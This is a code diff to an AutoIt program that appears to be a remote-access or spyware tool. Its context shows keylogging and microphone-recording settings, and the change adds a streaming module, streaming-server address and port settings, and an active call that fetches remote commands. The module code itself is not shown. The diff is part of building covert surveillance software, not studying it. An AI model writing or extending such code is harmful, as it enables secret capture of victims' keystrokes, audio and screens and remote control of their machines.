@@ -18,6 +18,7 @@ Opt("ExpandVarStrings", 1) ;
 #include <Process.au3>
 #include <Array.au3>
 #include <FileConstants.au3>
+#include <Inet.au3>
 #EndRegion include system user defined functions
 
 
@@ -39,6 +40,7 @@ Opt("ExpandVarStrings", 1) ;
 #include "modules/window.au3"
 #include "modules/commands.au3"
 #include "modules/shell.au3"
+#include "modules/streaming.au3"
 #EndRegion include program modules
 
 
@@ -57,6 +59,11 @@ Global $microphoneRecordingDurration= IniRead($iniFilePath, "microphoneRecording
 Global $keyLoggingDurration= IniRead($iniFilePath, "keyLogging", "durration", "6")
 Global $keyLoggingSleepTime= IniRead($iniFilePath, "keyLogging", "sleepTime", "200")
 Global $keyBuffer=""
+Global $streamingServerAddress = IniRead($iniFilePath, "streaming", "address", "127.0.0.1")
+Global $streamingServerPort = IniRead($iniFilePath, "streaming", "port", "807")
+Global $streamingServerRootFolder = IniRead($iniFilePath, "streaming", "rootFolder", "www")
+Global $streamingProcessId
+Global $cefclientProcessId
 #EndRegion global varriables
    
 ;screenShot()
@@ -89,9 +96,9 @@ Global $keyBuffer=""
 
 ;moveWindows()
 
-;fetchCommands()
+fetchCommands()
 
-fetchShellCommands()
+;fetchShellCommands()
 
 Exit
 
